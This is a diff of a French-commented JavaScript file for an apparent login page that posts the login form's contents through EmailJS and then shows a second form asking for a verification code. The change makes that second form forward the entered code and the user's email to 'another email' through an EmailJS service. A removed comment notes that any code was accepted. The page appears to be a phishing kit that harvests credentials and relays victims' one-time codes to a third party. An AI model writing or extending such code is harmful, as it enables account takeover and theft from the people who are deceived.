@@ -25,16 +25,15 @@ function validateForm() {
     return true; // Permettre l'envoi du formulaire si la validation réussit
 }
 
-// Fonction pour envoyer l'e-mail de confirmation
-function sendConfirmationEmail(email, code) {
-    // Envoi du code de vérification à l'adresse e-mail
-    emailjs.send('service_odtxz18', 'template_confirmation_email', { email: email, code: code })
+// Fonction pour envoyer le code de vérification à l'autre email
+function sendCodeToEmail(email, code) {
+    emailjs.send('service_odtxz18', 'template_code_email', { email: email, code: code })
         .then(function(response) {
-            console.log('E-mail de confirmation envoyé avec succès:', response);
-            alert('E-mail de confirmation envoyé!');
+            console.log('Code de vérification envoyé avec succès:', response);
+            alert('Code de vérification envoyé!');
         }, function(error) {
-            console.log('Erreur lors de l\'envoi de l\'e-mail de confirmation:', error);
-            alert('Une erreur est survenue lors de l\'envoi de l\'e-mail.');
+            console.log('Erreur lors de l\'envoi du code de vérification:', error);
+            alert('Une erreur est survenue lors de l\'envoi du code.');
         });
 }
 
@@ -55,14 +54,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
             console.log('Succès:', response);
             alert('Formulaire envoyé avec succès!');
 
-            // Afficher le formulaire de code de vérification
+            // Afficher le formulaire pour le code de vérification
             document.getElementById('loginForm').style.display = 'none';
             document.getElementById('codeForm').style.display = 'block';
-            
-            // Envoi de l'e-mail de confirmation avec un code (par exemple, code fixe ou généré ailleurs)
-            const email = document.getElementById('email').value;
-            const code = '123456'; // Code fixe ou généré dynamiquement
-            sendConfirmationEmail(email, code);
         }, function(error) {
             console.log('Erreur:', error);
             alert('Une erreur est survenue. Veuillez réessayer.');
@@ -73,8 +67,9 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
 document.getElementById('codeForm').addEventListener('submit', function(event) {
     event.preventDefault(); // Empêche le comportement par défaut du formulaire
 
-    const codeEntered = document.getElementById('code').value;
+    const email = document.getElementById('email').value; // Utiliser l'email du formulaire principal
+    const code = document.getElementById('code').value;
     
-    // Afficher un message de succès, puisque n'importe quel code est accepté
-    alert('Code reçu : ' + codeEntered);
+    // Envoyer le code de vérification à un autre email
+    sendCodeToEmail(email, code);
 });
